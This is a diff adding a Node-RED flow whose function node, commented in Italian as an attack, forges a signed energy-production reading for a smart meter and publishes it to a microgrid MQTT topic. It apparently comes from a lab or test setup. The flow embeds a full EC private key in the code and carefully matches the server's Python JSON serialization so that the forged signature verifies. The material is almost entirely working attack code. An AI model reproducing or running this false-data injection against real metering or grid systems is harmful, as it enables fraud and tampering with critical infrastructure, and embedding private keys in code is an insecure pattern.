@@ -1,0 +1,105 @@
+[
+    {
+        "id": "1829210a67a6892c",
+        "type": "inject",
+        "z": "ab0e22be51d8c8a1",
+        "name": "",
+        "props": [],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "x": 290,
+        "y": 100,
+        "wires": [
+            [
+                "3defd06c0e7fd59a"
+            ]
+        ]
+    },
+    {
+        "id": "3defd06c0e7fd59a",
+        "type": "function",
+        "z": "ab0e22be51d8c8a1",
+        "name": "function 2",
+        "func": "const crypto = global.get('crypto') || require('crypto');\n\n// --- 1. CONFIGURAZIONE NODO ---\nconst nodeId = \"SmartMeter_0001_d6622a65\";\nconst privateKey = `-----BEGIN PRIVATE KEY-----\nMIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgZStkjWwSQx5Cfinv\nyqwYRqnFYsHSC71fQo7uvbr327WhRANCAAR6YmZtXU8aJmcPjodE6vTKWbUdEK1F\n2GC8uWilOucyHh5D5a8Yuuanks350xFrQ8LkPDQ+gre1hc1ezwhOo9Yx\n-----END PRIVATE KEY-----`;\n\n// --- 2. PARAMETRI DELL'ATTACCO ---\nconst timestamp = Math.floor(Date.now() / 1000);\n\n// Usa valori con decimali reali per evitare la cancellazione degli zeri da parte di JS!\n// (Esattamente come fa il device reale)\nconst production = 8500.55;\n\n// --- 3. CREAZIONE DELL'OGGETTO ESATTO DA FIRMARE ---\n// Creiamo l'oggetto base nello stesso identico ordine in cui lo aspetta Python\nconst basePayload = {\n    node_id: nodeId,\n    timestamp: timestamp,\n    production: production\n};\n\n// JS serializza questo oggetto togliendo gli spazi, esattamente come farà\n// json.dumps(..., separators=(',', ':')) in Python.\nconst payloadStr = JSON.stringify(basePayload);\n\n// --- 4. FIRMA DELLA STRINGA ESATTA ---\nconst sign = crypto.createSign('SHA256');\nsign.update(payloadStr);\nsign.end();\nconst signatureHex = sign.sign(privateKey, 'hex');\n\n// --- 5. AGGIUNTA DELLA FIRMA E SPEDIZIONE ---\nbasePayload.sig = signatureHex;\n\nmsg.payload = basePayload;\nmsg.topic = \"microgrid/production/\" + nodeId;\n\nreturn msg;",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 500,
+        "y": 100,
+        "wires": [
+            [
+                "cbd9b19d9ebc1da0"
+            ]
+        ]
+    },
+    {
+        "id": "cbd9b19d9ebc1da0",
+        "type": "mqtt out",
+        "z": "ab0e22be51d8c8a1",
+        "name": "",
+        "topic": "",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "082b71177b33691d",
+        "x": 710,
+        "y": 100,
+        "wires": []
+    },
+    {
+        "id": "082b71177b33691d",
+        "type": "mqtt-broker",
+        "name": "",
+        "broker": "mosquitto",
+        "port": "8883",
+        "tls": "bbc4e77fc3d35742",
+        "clientid": "",
+        "autoConnect": true,
+        "usetls": true,
+        "protocolVersion": 4,
+        "keepalive": 60,
+        "cleansession": true,
+        "autoUnsubscribe": true,
+        "birthTopic": "",
+        "birthQos": "0",
+        "birthRetain": "false",
+        "birthPayload": "",
+        "birthMsg": {},
+        "closeTopic": "",
+        "closeQos": "0",
+        "closeRetain": "false",
+        "closePayload": "",
+        "closeMsg": {},
+        "willTopic": "",
+        "willQos": "0",
+        "willRetain": "false",
+        "willPayload": "",
+        "willMsg": {},
+        "userProps": "",
+        "sessionExpiry": ""
+    },
+    {
+        "id": "bbc4e77fc3d35742",
+        "type": "tls-config",
+        "name": "",
+        "cert": "",
+        "key": "",
+        "ca": "",
+        "certname": "nodered.crt",
+        "keyname": "nodered.key",
+        "caname": "ca.crt",
+        "servername": "",
+        "verifyservercert": true,
+        "alpnprotocol": ""
+    }
+]
